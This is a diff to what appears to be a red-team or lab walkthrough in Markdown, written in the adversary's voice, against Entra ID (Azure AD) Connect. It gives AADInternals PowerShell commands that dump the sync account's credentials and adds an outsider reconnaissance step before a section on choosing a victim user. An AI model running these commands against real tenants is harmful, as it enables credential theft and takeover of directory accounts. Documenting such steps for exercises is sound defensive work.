@@ -12,11 +12,14 @@ From this point on you act as the adversary, without knowing the Entra / AD Cred
 #### 1. Dumping and Extracting Entra (Azure AD) Connect credentials:
 1. run powershell as admin on the server where Entra Connect is installed
 2. execute:
-    ```powershell
-    Import-Module AADInternals
-    Get-AADIntSyncCredentials
-    ```
-
+```powershell
+Import-Module AADInternals
+Get-AADIntSyncCredentials
+```
+3. get some recon:
+```powershell
+Invoke-AADIntReconAsOutsider -DomainName YOURDOMAIN.onmicrosoft.com
+```
 
 #### 2. Finding a target (victim) user to attack
 
